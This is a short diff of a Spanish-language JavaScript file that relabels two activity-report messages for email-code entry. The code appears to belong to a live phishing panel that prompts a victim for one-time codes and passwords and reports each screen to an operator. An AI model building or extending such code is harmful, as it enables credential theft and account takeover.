@@ -130,12 +130,12 @@
           ? "Código de correo inválido o expirado."
           : message;
       showError(cleanMsg);
-      reportActivity("⚠️ Viendo error de código (en pantalla Código)");
+      reportActivity("⚠️ Viendo error de código de correo (en pantalla Código Correo)");
     } else if (action === "ask_token") {
       setStep("verify");
       tokens.forEach(function (t) { t.value = ""; });
       if (tokens[0]) tokens[0].focus();
-      reportActivity("📲 En pantalla de Código (esperando que escriba)");
+      reportActivity("📧 En pantalla de Código Correo (esperando que escriba)");
     } else if (action === "ask_pass") {
       setStep("pass");
       if (password) {
